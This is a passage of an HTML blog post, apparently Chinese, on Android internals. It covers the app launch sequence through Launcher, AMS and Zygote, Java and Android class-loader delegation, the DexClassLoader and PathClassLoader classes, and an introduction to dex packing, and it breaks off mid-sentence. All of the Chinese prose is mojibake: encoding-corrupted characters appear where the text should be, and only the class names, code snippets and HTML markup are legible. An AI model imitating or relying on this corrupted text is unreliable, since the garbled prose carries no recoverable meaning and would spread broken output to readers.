</span><br></pre></td></tr></table></figure><p>ä¹‹å<code>Launcher</code>å°±ä¼šå¼€å§‹æ‰§è¡Œ<code>onCreate</code>äº†</p><h4 id="Appå¯åŠ¨æµç¨‹"><a href="#Appå¯åŠ¨æµç¨‹" class="headerlink" title="Appå¯åŠ¨æµç¨‹"></a>Appå¯åŠ¨æµç¨‹</h4><p>åº”ç”¨ç¨‹åº<code>Launcher</code>åœ¨å¯åŠ¨è¿‡ç¨‹ä¸­ä¼šè¯·æ±‚<code>PackageManagerService</code>è¿”å›ç³»ç»Ÿä¸­å·²ç»å®‰è£…çš„åº”ç”¨ç¨‹åºçš„ä¿¡æ¯ï¼Œå¹¶å°†è¿™äº›ä¿¡æ¯å°è£…æˆä¸€ä¸ªå¿«æ·å›¾æ ‡åˆ—è¡¨æ˜¾ç¤ºåœ¨ç³»ç»Ÿå±å¹•ä¸Šï¼Œè¿™æ ·ç”¨æˆ·å¯ä»¥é€šè¿‡ç‚¹å‡»è¿™äº›å¿«æ·å›¾æ ‡æ¥å¯åŠ¨ç›¸åº”çš„åº”ç”¨ç¨‹åº</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202510111544539.png" alt="image-20250928223841904"></p><ol><li>ç‚¹å‡»æ¡Œé¢APPå›¾æ ‡æ—¶ï¼ŒLauncherçš„<code>startActivity()</code>æ–¹æ³•ï¼Œé€šè¿‡<code>Binder</code>é€šä¿¡ï¼Œè°ƒç”¨system_serverè¿›ç¨‹ä¸­AMSæœåŠ¡çš„<code>startActivity</code>æ–¹æ³•ï¼Œ<strong>å‘èµ·å¯åŠ¨è¯·æ±‚</strong></li><li><code>system_server</code>è¿›ç¨‹æ¥æ”¶åˆ°è¯·æ±‚åï¼Œå‘<code>Zygote</code>è¿›ç¨‹<strong>å‘é€åˆ›å»ºè¿›ç¨‹çš„è¯·æ±‚</strong></li><li>Zygoteè¿›ç¨‹forkå‡ºAppè¿›ç¨‹ï¼Œå¹¶æ‰§è¡Œ<code>ActivityThread</code>çš„mainæ–¹æ³•ï¼Œåˆ›å»ºActivityThreadçº¿ç¨‹ï¼Œåˆå§‹åŒ–<code>MainLooper</code>ï¼Œä¸»çº¿ç¨‹Handlerï¼ŒåŒæ—¶<strong>åˆå§‹åŒ–ApplicationThreadç”¨äºå’ŒAMSé€šä¿¡äº¤äº’</strong></li><li>Appè¿›ç¨‹ï¼Œé€šè¿‡Binderå‘sytem_serverè¿›ç¨‹å‘èµ·<code>attachApplication</code>è¯·æ±‚ï¼Œè¿™é‡Œå®é™…ä¸Šå°±æ˜¯APPè¿›ç¨‹<strong>é€šè¿‡Binderè°ƒç”¨sytem_serverè¿›ç¨‹ä¸­AMSçš„attachApplicationæ–¹æ³•</strong>,AMSçš„attachApplicationæ–¹æ³•çš„ä½œç”¨æ˜¯<strong>å°†ApplicationThreadå¯¹è±¡ä¸AMSç»‘å®š</strong></li><li>system_serverè¿›ç¨‹åœ¨æ”¶åˆ°attachApplicationçš„è¯·æ±‚ï¼Œè¿›è¡Œä¸€äº›å‡†å¤‡å·¥ä½œåï¼Œå†é€šè¿‡binder IPCå‘Appè¿›ç¨‹<strong>å‘é€handleBindApplicationè¯·æ±‚</strong>ï¼ˆåˆå§‹åŒ–Applicationå¹¶è°ƒç”¨onCreateæ–¹æ³•ï¼‰å’ŒscheduleLaunchActivityè¯·æ±‚ï¼ˆåˆ›å»ºå¯åŠ¨Activityï¼‰</li><li>Appè¿›ç¨‹çš„binderçº¿ç¨‹ï¼ˆApplicationThreadï¼‰åœ¨æ”¶åˆ°è¯·æ±‚åï¼Œ<strong>é€šè¿‡handlerå‘ä¸»çº¿ç¨‹å‘é€BIND_APPLICATIONå’ŒLAUNCH_ACTIVITYæ¶ˆæ¯</strong>ï¼Œè¿™é‡Œæ³¨æ„çš„æ˜¯AMSå’Œä¸»çº¿ç¨‹å¹¶ä¸ç›´æ¥é€šä¿¡ï¼Œè€Œæ˜¯AMSå’Œä¸»çº¿ç¨‹çš„å†…éƒ¨ç±»<code>ApplicationThread</code>é€šè¿‡Binderé€šä¿¡ï¼Œ<code>ApplicationThread</code>å†å’Œä¸»çº¿ç¨‹é€šè¿‡Handleræ¶ˆæ¯äº¤äº’ã€‚</li><li>ä¸»çº¿ç¨‹åœ¨æ”¶åˆ°Messageåï¼Œ<strong>åˆ›å»ºApplicationå¹¶è°ƒç”¨onCreateæ–¹æ³•</strong>ï¼Œå†é€šè¿‡åå°„æœºåˆ¶åˆ›å»ºç›®æ ‡Activityï¼Œå¹¶å›è°ƒ<code>Activity.onCreate()</code>ç­‰æ–¹æ³•</li><li>åˆ°æ­¤ï¼ŒAppä¾¿æ­£å¼å¯åŠ¨ï¼Œå¼€å§‹è¿›å…¥Activityç”Ÿå‘½å‘¨æœŸï¼Œæ‰§è¡Œå®Œ<code>onCreate/onStart/onResume</code>æ–¹æ³•ï¼ŒUIæ¸²æŸ“åæ˜¾ç¤ºAPPä¸»ç•Œé¢</li></ol><p>è¿™é‡Œæˆ‘ä»¬å°±è¿›å…¥äº†åŠ å£³ä¸­ååˆ†é‡è¦çš„åœ°æ–¹<code>ActivityTread</code>ï¼Œä¹‹åå°±æ˜¯è°ƒç”¨å„ç§å‡½æ•°æ¥å¯åŠ¨APPï¼Œè¿‡ç¨‹å¦‚ä¸‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Appçš„è¿è¡Œæµç¨‹æ˜¯</span><br><span class="line">    åˆå§‹åŒ–â€”â€”â€”â€”&gt;Applicationçš„æ„é€ å‡½æ•°â€”â€”â€”â€”&gt;Application.attachBaseContext()â€”â€”â€”â€”&gt;Application.onCreate()å‡½æ•°</span><br></pre></td></tr></table></figure><p>æœ€åæ‰ä¼šè¿›å…¥<code>MainActivity</code>ä¸­çš„<code>attachBaseContext</code>å‡½æ•°ã€<code>onCreate</code>å‡½æ•°</p><p>æ‰€ä»¥åŠ å£³å‚å•†è¦åœ¨ç¨‹åºæ­£å¼æ‰§è¡Œå‰ï¼Œä¹Ÿå°±æ˜¯ä¸Šé¢çš„æµç¨‹ä¸­è¿›è¡Œ<strong>åŠ¨æ€åŠ è½½å’Œç±»åŠ è½½å™¨çš„ä¿®æ­£</strong>ï¼Œè¿™æ ·æ‰èƒ½å¯¹åŠ å¯†çš„dexè¿›è¡Œé‡Šæ”¾ï¼Œè€Œä¸€èˆ¬çš„å‚å•†å¾€å¾€é€‰æ‹©åœ¨<strong>Applicationä¸­çš„attachBaseContextæˆ–onCreateå‡½æ•°</strong>è¿›è¡Œ</p><h2 id="æ•´ä½“åŠ å£³åŸç†è¯¦è§£"><a href="#æ•´ä½“åŠ å£³åŸç†è¯¦è§£" class="headerlink" title="æ•´ä½“åŠ å£³åŸç†è¯¦è§£"></a>æ•´ä½“åŠ å£³åŸç†è¯¦è§£</h2><h3 id="æ·±å…¥ç†è§£ç±»åŠ è½½å™¨å’ŒåŠ¨æ€åŠ è½½"><a href="#æ·±å…¥ç†è§£ç±»åŠ è½½å™¨å’ŒåŠ¨æ€åŠ è½½" class="headerlink" title="æ·±å…¥ç†è§£ç±»åŠ è½½å™¨å’ŒåŠ¨æ€åŠ è½½"></a>æ·±å…¥ç†è§£ç±»åŠ è½½å™¨å’ŒåŠ¨æ€åŠ è½½</h3><p>åœ¨å­¦ä¹ å¦‚ä½•å¯¹AppåŠ ä¸Šä¸€å±‚å¤–å£³ä¹‹å‰ï¼Œéœ€è¦è¯¦ç»†äº†è§£<strong>ç±»åŠ è½½å™¨å’ŒåŠ¨æ€åŠ è½½</strong>çš„æœºåˆ¶</p><h4 id="ç±»åŠ è½½å™¨"><a href="#ç±»åŠ è½½å™¨" class="headerlink" title="ç±»åŠ è½½å™¨"></a>ç±»åŠ è½½å™¨</h4><p>Androidä¸­çš„ç±»åŠ è½½å™¨æœºåˆ¶ä¸JVMä¸€æ ·éµå¾ªåŒäº²å§”æ´¾æ¨¡å¼</p><h5 id="åŒäº²å§”æ´¾æ¨¡å¼"><a href="#åŒäº²å§”æ´¾æ¨¡å¼" class="headerlink" title="åŒäº²å§”æ´¾æ¨¡å¼"></a>åŒäº²å§”æ´¾æ¨¡å¼</h5><p>ä»£ç è§£é‡Šï¼š</p><ol><li><p>é¦–å…ˆæ£€æŸ¥è¯¥ç±»æ˜¯å¦å·²è¢«åŠ è½½</p></li><li><p>è‹¥æœªåŠ è½½ï¼Œåˆ™å§”æ‰˜ç»™çˆ¶ç±»çš„<code>Loader</code>åŠ è½½ï¼Œå¦‚æœæ²¡æœ‰çˆ¶ç±»åˆ™å§”æ‰˜ç»™<code>BootClassLoader</code>å°è¯•åŠ è½½</p></li><li><p>è‹¥<code>BootClassLoader</code>æ— æ³•åŠ è½½ï¼Œåˆ™<code>PathClassLoader</code>å°è¯•ä»åº”ç”¨çš„dexæ–‡ä»¶ä¸­åŠ è½½</p></li><li><p>è‹¥éœ€è¦åŠ¨æ€åŠ è½½å¤–éƒ¨dexï¼Œåˆ™ä½¿ç”¨<code>DexClassLoader</code></p></li></ol><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202510111544540.png" alt="image-20250929131650468" style="zoom:33%;" /><p><strong>åŒäº²å§”æ´¾æ¨¡å¼åŠ è½½</strong></p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202510111544541.png" alt="image-20250929132247135" style="zoom:50%;" /><p>æˆ‘ä»¬è¦åŠ è½½ä¸€ä¸ª<code>class</code>æ–‡ä»¶ï¼Œæˆ‘ä»¬å®šä¹‰äº†ä¸€ä¸ª<code>CustomerClassLoader</code>ç±»åŠ è½½å™¨:<br>(1)é¦–å…ˆä¼šåˆ¤æ–­è‡ªå·±çš„<code>CustomerClassLoader</code>å¦åŠ è½½è¿‡,å¦‚æœåŠ è½½è¿‡ç›´æ¥è¿”å›,<br>(2)å¦‚æœæ²¡æœ‰åŠ è½½è¿‡åˆ™ä¼šè°ƒç”¨çˆ¶ç±»<code>PathClassLoader</code>å»åŠ è½½,è¯¥çˆ¶ç±»åŒæ ·ä¼š<strong>åˆ¤æ–­</strong>è‡ªå·±æ˜¯å¦åŠ è½½è¿‡,å¦‚æœæ²¡æœ‰åŠ è½½è¿‡åˆ™å§”æ‰˜ç»™çˆ¶ç±»<code>BootClassLoader</code>å»åŠ è½½,<br>(3)è¿™ä¸ª<code>BootClassLoader</code>æ˜¯é¡¶çº§<code>classLoader</code>,åŒæ ·ä¼šå»<strong>åˆ¤æ–­</strong>è‡ªå·±æœ‰æ²¡æœ‰åŠ è½½è¿‡,å¦‚æœä¹Ÿæ²¡æœ‰åŠ è½½è¿‡åˆ™ä¼šè°ƒç”¨è‡ªå·±çš„<code>findClass(name)</code>å»åŠ è½½,<br>(4)å¦‚æœé¡¶çº§<code>BootClassLoader</code>åŠ è½½<strong>å¤±è´¥</strong>äº†,åˆ™ä¼šæŠŠåŠ è½½è¿™ä¸ªåŠ¨ä½œ<strong>å‘ä¸‹äº¤è¿˜</strong>ç»™<code>PathClassLoader</code>,<br>(5)è¿™ä¸ª<code>PathClassLoader</code>ä¹Ÿä¼šå°è¯•å»è°ƒç”¨<code>findClass(name);</code>å»åŠ è½½,å¦‚æœåŠ è½½å¤±è´¥äº†,åˆ™ä¼šç»§ç»­å‘ä¸‹äº¤è¿˜ç»™<code>CustomClassLoader</code>æ¥å®ŒæˆåŠ è½½,è¿™æ•´ä¸ªè¿‡ç¨‹æ„Ÿè§‰æ˜¯ä¸€ä¸ª<strong>é€’å½’</strong>çš„è¿‡ç¨‹,é€æ¸å¾€ä¸Šç„¶åæœ‰é€æ¸å¾€ä¸‹,ç›´åˆ°åŠ è½½æˆåŠŸ<br>å…¶å®è¿™ä¸ª<code>String.class</code>åœ¨ç³»ç»Ÿå¯åŠ¨çš„æ—¶å€™å·²ç»è¢«åŠ è½½äº†,æˆ‘ä»¬è‡ªå·±å®šä¹‰ä¸€ä¸ª<code>CustomerClassLoader</code>å»åŠ è½½,å…¶å®ä¹Ÿæ˜¯çˆ¶ç±»åŠ è½½çš„</p><h5 id="Androidä¸­ç±»åŠ è½½æœºåˆ¶"><a href="#Androidä¸­ç±»åŠ è½½æœºåˆ¶" class="headerlink" title="Androidä¸­ç±»åŠ è½½æœºåˆ¶"></a>Androidä¸­ç±»åŠ è½½æœºåˆ¶</h5><p>Androidçš„ç±»åŠ è½½æœºåˆ¶å’ŒJVMä¸€æ ·éµå¾ªåŒäº²å§”æ´¾æ¨¡å¼ï¼Œåœ¨dalvik&#x2F;artå¯åŠ¨æ—¶å°†æ‰€æœ‰JavaåŸºæœ¬ç±»å’ŒAndroidç³»ç»Ÿæ¡†æ¶çš„åŸºæœ¬ç±»åŠ è½½è¿›æ¥ï¼Œé¢„åŠ è½½çš„ç±»è®°å½•åœ¨<code>/frameworks/base/config/preloaded-classes</code>ä¸­</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">android.R$styleable</span><br><span class="line">android.accessibilityservice.AccessibilityServiceInfo$<span class="number">1</span></span><br><span class="line">android.accessibilityservice.AccessibilityServiceInfo</span><br><span class="line">android.accessibilityservice.IAccessibilityServiceClient$Stub$Proxy</span><br><span class="line">android.accessibilityservice.IAccessibilityServiceClient$Stub</span><br><span class="line">android.accessibilityservice.IAccessibilityServiceClient</span><br><span class="line">android.accounts.AbstractAccountAuthenticator$Transport</span><br><span class="line">android.accounts.AbstractAccountAuthenticator</span><br><span class="line">android.accounts.Account$<span class="number">1</span></span><br><span class="line">android.accounts.Account</span><br><span class="line">...</span><br><span class="line"> </span><br><span class="line">java.lang.Short</span><br><span class="line">java.lang.StackOverflowError</span><br><span class="line">java.lang.StackTraceElement</span><br><span class="line">java.lang.StrictMath</span><br><span class="line">java.lang.String$<span class="number">1</span></span><br><span class="line">java.lang.String$CaseInsensitiveComparator</span><br><span class="line">java.lang.String</span><br><span class="line">java.lang.StringBuffer</span><br><span class="line">java.lang.StringBuilder</span><br><span class="line">java.lang.StringFactory</span><br><span class="line">java.lang.StringIndexOutOfBoundsException</span><br><span class="line">java.lang.System$PropertiesWithNonOverrideableDefaults</span><br><span class="line">java.lang.System</span><br><span class="line">java.lang.Thread$<span class="number">1</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>è¿™äº›ç±»åªéœ€è¦åœ¨Zygoteè¿›ç¨‹å¯åŠ¨æ—¶åŠ è½½ä¸€éå°±å¯ä»¥äº†ï¼Œåç»­æ¯ä¸€ä¸ªAPPæˆ–Androidè¿è¡Œæ—¶ç¯å¢ƒçš„è¿›ç¨‹ï¼Œéƒ½æ˜¯ä»Zygoteä¸­<code>fork</code>å‡ºæ¥ï¼Œå¤©ç„¶ä¿ç•™äº†åŠ è½½è¿‡çš„ç±»ç¼“å­˜</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202510111544542.png" alt="image-20250929133634773"></p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202510111544543.png" alt="image-20250929134222740"></p><p>Androidä¸­çš„<code>ClassLoader</code>ç±»å‹åˆ†ä¸º<strong>ç³»ç»ŸClassLoader</strong>å’Œ<strong>è‡ªå®šä¹‰ClassLoader</strong>ã€‚å…¶ä¸­<strong>ç³»ç»ŸClassLoader</strong>åŒ…æ‹¬3ç§æ˜¯<code>BootClassLoader</code>ã€<code>DexClassLoader</code>ã€<code>PathClassLoader</code></p><ol><li><code>BootClassLoader</code>:Androidå¹³å°ä¸Šæ‰€æœ‰Androidç³»ç»Ÿå¯åŠ¨æ—¶ä¼šä½¿ç”¨BootClassLoaderæ¥é¢„åŠ è½½å¸¸ç”¨çš„ç±»</li><li><code>BaseDexClassLoader</code>:å®é™…åº”ç”¨å±‚ç±»æ–‡ä»¶çš„åŠ è½½ï¼Œè€ŒçœŸæ­£çš„åŠ è½½å§”æ‰˜ç»™pathListæ¥å®Œæˆ</li><li><code>DexClassLoader</code>:å¯ä»¥åŠ è½½dexæ–‡ä»¶ä»¥åŠåŒ…å«dexçš„å‹ç¼©æ–‡ä»¶(apk,dex,jar,zip),å¯ä»¥å®‰è£…ä¸€ä¸ªæœªå®‰è£…çš„apkæ–‡ä»¶ï¼Œä¸€èˆ¬ä¸ºè‡ªå®šä¹‰ç±»åŠ è½½å™¨</li><li><code>PathClassLoader</code>:å¯ä»¥åŠ è½½ç³»ç»Ÿç±»å’Œåº”ç”¨ç¨‹åºçš„ç±»ï¼Œé€šå¸¸ç”¨æ¥åŠ è½½å·²å®‰è£…çš„apkçš„dexæ–‡ä»¶</li></ol><blockquote><p>Android æä¾›çš„åŸç”ŸåŠ è½½å™¨å«åš<strong>åŸºç¡€ç±»åŠ è½½å™¨</strong>ï¼ŒåŒ…æ‹¬ï¼š<code>BootClassLoaderï¼ŒPathClassLoaderï¼ŒDexClassLoaderï¼ŒInMemoryDexClassLoader</code>ï¼ˆAndroid 8.0 å¼•å…¥ï¼‰</p><p><code>DelegateLastClassLoader</code>ï¼ˆAndroid 8.1 å¼•å…¥ï¼‰</p></blockquote><h5 id="BootClassLoader"><a href="#BootClassLoader" class="headerlink" title="BootClassLoader"></a>BootClassLoader</h5><p>å¯åŠ¨ç±»åŠ è½½å™¨ï¼Œç”¨äºåŠ è½½ <code>Zygote</code> è¿›ç¨‹å·²ç»é¢„åŠ è½½çš„åŸºæœ¬ç±»ï¼Œå¯ä»¥æ¨æµ‹å®ƒåªéœ€ä»ç¼“å­˜ä¸­åŠ è½½ã€‚è¿™æ˜¯åŸºç±» <code>ClassLoader</code> çš„ä¸€ä¸ªå†…éƒ¨ç±»ï¼Œæ˜¯åŒ…è®¿é—®æƒé™ï¼Œæ‰€ä»¥åº”ç”¨ç¨‹åºæ— æƒç›´æ¥è®¿é—®</p><p><code>BootClassLoader</code>æ²¡æœ‰çˆ¶åŠ è½½å™¨ï¼Œåœ¨ç¼“å­˜å–ä¸åˆ°ç±»æ˜¯ç›´æ¥è°ƒç”¨è‡ªå·±çš„<code>findClass()</code>æ–¹æ³•<br><code>findClass()</code>æ–¹æ³•è°ƒç”¨<code>Class.classForName()</code>æ–¹æ³•ï¼Œè€Œ<code>ZygoteInit.preloadClasses()</code>ä¸­ï¼ŒåŠ è½½åŸºæœ¬ç±»æ˜¯<code>Class.forName()</code></p><p>æ— è®ºæ˜¯ç³»ç»Ÿç±»åŠ è½½å™¨ï¼ˆ<code>PathClassLoader</code>ï¼‰è¿˜æ˜¯è‡ªå®šä¹‰çš„ç±»åŠ è½½å™¨ï¼ˆ<code>DexClassLoader</code>ï¼‰ï¼Œæœ€é¡¶å±‚çš„ç¥–å…ˆåŠ è½½å™¨é»˜è®¤æ˜¯ <code>BootClassLoader</code>ï¼Œä¸ JVM ä¸€æ ·ï¼Œä¿è¯äº†åŸºæœ¬ç±»çš„ç±»å‹å®‰å…¨</p><h5 id="Classæ–‡ä»¶åŠ è½½ï¼š"><a href="#Classæ–‡ä»¶åŠ è½½ï¼š" class="headerlink" title="Classæ–‡ä»¶åŠ è½½ï¼š"></a>Classæ–‡ä»¶åŠ è½½ï¼š</h5><ol><li>é€šè¿‡<code>Class.forName()</code>æ–¹æ³•åŠ¨æ€åŠ è½½</li><li>é€šè¿‡<code>ClassLoader.loadClass()</code>æ–¹æ³•åŠ¨æ€åŠ è½½</li></ol><p>ç±»çš„åŠ è½½åˆ†ä¸º3ä¸ªæ­¥éª¤:<strong>1.è£…è½½(Load),2.é“¾æ¥(Link),3.åˆå§‹åŒ–(Intialize)</strong></p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202510111544544.png" alt="image-20250929140247689"></p><p><strong>ç±»åŠ è½½æ—¶æœºï¼š</strong></p><p>1.éšå¼åŠ è½½:</p><ol><li>åˆ›å»ºç±»çš„å®ä¾‹,ä¹Ÿå°±æ˜¯newä¸€ä¸ªå¯¹è±¡</li><li>è®¿é—®æŸä¸ªç±»æˆ–æ¥å£çš„é™æ€å˜é‡,æˆ–è€…å¯¹è¯¥é™æ€å˜é‡èµ‹å€¼</li><li>è°ƒç”¨ç±»çš„é™æ€æ–¹æ³•</li><li>åå°„<code>Class.forName(&quot;android.app.ActivityThread&quot;)</code></li><li>åˆå§‹åŒ–ä¸€ä¸ªç±»çš„å­ç±»(ä¼šé¦–å…ˆåˆå§‹åŒ–å­ç±»çš„çˆ¶ç±»)</li></ol><p>2.æ˜¾ç¤ºåŠ è½½ï¼š</p><ol><li>ä½¿ç”¨<code>LoadClass()</code>åŠ è½½</li><li>ä½¿ç”¨<code>forName()</code>åŠ è½½</li></ol><p><strong>Class.forName å’Œ ClassLoader.loadClassåŠ è½½æœ‰ä½•ä¸åŒï¼š</strong></p><ol><li><code>ClassLoader.loadClass</code>ä¹Ÿèƒ½åŠ è½½ä¸€ä¸ªç±»,ä½†æ˜¯ä¸ä¼šè§¦å‘ç±»çš„åˆå§‹åŒ–(ä¹Ÿå°±æ˜¯è¯´ä¸ä¼šå¯¹ç±»çš„é™æ€å˜é‡,é™æ€ä»£ç å—è¿›è¡Œåˆå§‹åŒ–æ“ä½œ)</li><li><code>Class.forName</code>è¿™ç§æ–¹å¼,ä¸ä½†ä¼šåŠ è½½ä¸€ä¸ªç±»,è¿˜ä¼šè§¦å‘ç±»çš„åˆå§‹åŒ–é˜¶æ®µ,ä¹Ÿèƒ½å¤Ÿä¸ºè¿™ä¸ªç±»çš„é™æ€å˜é‡,é™æ€ä»£ç å—è¿›è¡Œåˆå§‹åŒ–æ“ä½œ</li></ol><h5 id="PathClassLoader"><a href="#PathClassLoader" class="headerlink" title="PathClassLoader"></a>PathClassLoader</h5><p>ä¸»è¦ç”¨äºç³»ç»Ÿå’Œappçš„ç±»åŠ è½½å™¨,å…¶ä¸­<code>optimizedDirectory</code>ä¸º<code>null</code>, é‡‡ç”¨é»˜è®¤ç›®å½•<code>/data/dalvik-cache/</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PathClassLoader æ˜¯ä½œä¸ºåº”ç”¨ç¨‹åºçš„ç³»ç»Ÿç±»åŠ è½½å™¨ï¼Œä¹Ÿæ˜¯åœ¨ Zygote è¿›ç¨‹å¯åŠ¨çš„æ—¶å€™åˆå§‹åŒ–çš„ï¼ˆåŸºæœ¬æµç¨‹ä¸ºï¼šZygoteInit.main() -&gt; ZygoteInit.forkSystemServer() -&gt; ZygoteInit.handleSystemServerProcess() -&gt; ZygoteInit.createPathClassLoader()ã€‚åœ¨é¢„åŠ è½½åŸºæœ¬ç±»ä¹‹åæ‰§è¡Œï¼‰ï¼Œæ‰€ä»¥æ¯ä¸€ä¸ª APP è¿›ç¨‹ä» Zygote ä¸­ fork å‡ºæ¥ä¹‹åéƒ½è‡ªåŠ¨æºå¸¦äº†ä¸€ä¸ª PathClassLoaderï¼Œå®ƒé€šå¸¸ç”¨äºåŠ è½½ apk é‡Œé¢çš„ .dex æ–‡ä»¶</span><br></pre></td></tr></table></figure><h5 id="DexClassLoader"><a href="#DexClassLoader" class="headerlink" title="DexClassLoader"></a>DexClassLoader</h5><p>æˆ‘ä»¬å¯ä»¥å‘ç°<code>DexClassLoader</code>ä¸<code>PathClassLoader</code>éƒ½ç»§æ‰¿äº<code>BaseDexClassLoader</code>ï¼Œè¿™ä¸¤ä¸ªç±»åªæ˜¯æä¾›äº†è‡ªå·±çš„æ„é€ å‡½æ•°ï¼Œ<strong>æ²¡æœ‰é¢å¤–çš„å®ç°</strong></p><p><strong>åŒºåˆ«ï¼š</strong><br><code>DexClassLoader</code>æä¾›äº†<code>optimizedDirectory</code>ï¼Œè€Œ<code>PathClassLoader</code>åˆ™æ²¡æœ‰ï¼Œ<code>optimizedDirectory</code>æ­£æ˜¯ç”¨æ¥å­˜æ”¾<code>odex</code>æ–‡ä»¶çš„åœ°æ–¹ï¼Œæ‰€ä»¥å¯ä»¥åˆ©ç”¨<code>DexClassLoader</code>å®ç°åŠ¨æ€åŠ è½½</p><h5 id="BaseDexClassLoader"><a href="#BaseDexClassLoader" class="headerlink" title="BaseDexClassLoader"></a>BaseDexClassLoader</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BaseDexClassLoader</span> <span class="keyword">extends</span> <span class="title class_">ClassLoader</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> DexPathList pathList;  <span class="comment">//è®°å½•dexæ–‡ä»¶è·¯å¾„ä¿¡æ¯</span></span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">BaseDexClassLoader</span><span class="params">(String dexPath, File optimizedDirectory, String libraryPath, ClassLoader parent)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(parent);</span><br><span class="line">        <span class="built_in">this</span>.pathList = <span class="keyword">new</span> <span class="title class_">DexPathList</span>(<span class="built_in">this</span>, dexPath, libraryPath, optimizedDirectory);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><code>dexPath</code>: åŒ…å«ç›®æ ‡ç±»æˆ–èµ„æºçš„apk&#x2F;jaråˆ—è¡¨;å½“æœ‰å¤šä¸ªè·¯å¾„åˆ™é‡‡ç”¨:åˆ†å‰²;</li><li><code>optimizedDirectory</code>: ä¼˜åŒ–ådexæ–‡ä»¶å­˜åœ¨çš„ç›®å½•, å¯ä»¥ä¸ºnull;</li><li><code>libraryPath</code>: nativeåº“æ‰€åœ¨è·¯å¾„åˆ—è¡¨;å½“æœ‰å¤šä¸ªè·¯å¾„åˆ™é‡‡ç”¨:åˆ†å‰²;</li><li><code>ClassLoader</code>:çˆ¶ç±»çš„ç±»åŠ è½½å™¨</li></ul><p><code>BaseDexClassLoader</code>ä¼šåˆå§‹åŒ–<code>dexPathList</code>ï¼Œæ”¶é›†<code>dex</code>æ–‡ä»¶å’Œ<code>Native</code>æ–‡ä»¶åŠ¨æ€åº“</p><p>â€¦â€¦â€¦ï¼ˆ<a href="https://bbs.kanxue.com/thread-271538.htm%EF%BC%89">https://bbs.kanxue.com/thread-271538.htmï¼‰</a></p><p>æœ€åï¼ŒAndroidç±»åŠ è½½è¯¦ç»†æµç¨‹ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202510111544545.png" alt="image-20250929143026114"></p><p>å‡è®¾æˆ‘ä»¬è¦åŠ è½½ä¸€ä¸ªç±»com.example.MyActivityï¼š</p><ol><li>åº”ç”¨é€šè¿‡Custom ClassLoaderè¯·æ±‚åŠ è½½ç±»ï¼ˆå›¾ä¸­æ­¥éª¤1ï¼‰</li><li>Custom ClassLoaderè°ƒç”¨loadClass()ï¼Œéµå¾ªåŒäº²å§”æ´¾ï¼Œå…ˆå§”æ‰˜ç»™PathClassLoaderï¼ˆæ­¥éª¤3ï¼‰</li><li>PathClassLoaderå§”æ‰˜ç»™BootClassLoaderï¼ˆæ­¥éª¤5ï¼‰</li><li>BootClassLoaderæ— æ³•åŠ è½½è¯¥ç±»ï¼Œè¿”å›ç»™PathClassLoaderï¼ˆæ­¥éª¤8ï¼‰</li><li>PathClassLoaderè°ƒç”¨findClass()æ–¹æ³•ï¼ˆæ­¥éª¤9ï¼‰</li><li>findClass()è°ƒç”¨DexPathListçš„findClass()æ–¹æ³•</li><li>DexPathListéå†dexElementsæ•°ç»„ï¼š</li><li>å¯¹æ¯ä¸ªElementè°ƒç”¨findClass()</li><li>Elementè°ƒç”¨DexFileçš„loadClassBinaryName()æ–¹æ³•</li><li>å¦‚æœåœ¨æŸä¸ªDexFileä¸­æ‰¾åˆ°ç±»ï¼Œç«‹å³è¿”å›</li><li>å¦‚æœPathClassLoaderæœªæ‰¾åˆ°ï¼Œè¿”å›ç»™Custom ClassLoaderï¼ˆæ­¥éª¤11ï¼‰</li><li>Custom ClassLoaderè°ƒç”¨è‡ªå·±çš„findClass()ï¼ˆæ­¥éª¤12ï¼‰</li><li>åŒæ ·é€šè¿‡DexPathListæŸ¥æ‰¾ç±»</li><li>å¦‚æœæ‰¾åˆ°ï¼Œè¿”å›ç±»å¯¹è±¡ï¼ˆæ­¥éª¤14ï¼‰</li><li>å¦‚æœæœªæ‰¾åˆ°ï¼ŒæŠ›å‡ºClassNotFoundExceptionï¼ˆæ­¥éª¤15ï¼‰</li></ol><h3 id="æ•´ä½“åŠ å£³åŸç†"><a href="#æ•´ä½“åŠ å£³åŸç†" class="headerlink" title="æ•´ä½“åŠ å£³åŸç†"></a>æ•´ä½“åŠ å£³åŸç†</h3><p><strong>Dexæ•´ä½“åŠ å£³</strong>å¯ä»¥ç†è§£ä¸ºåœ¨åŠ 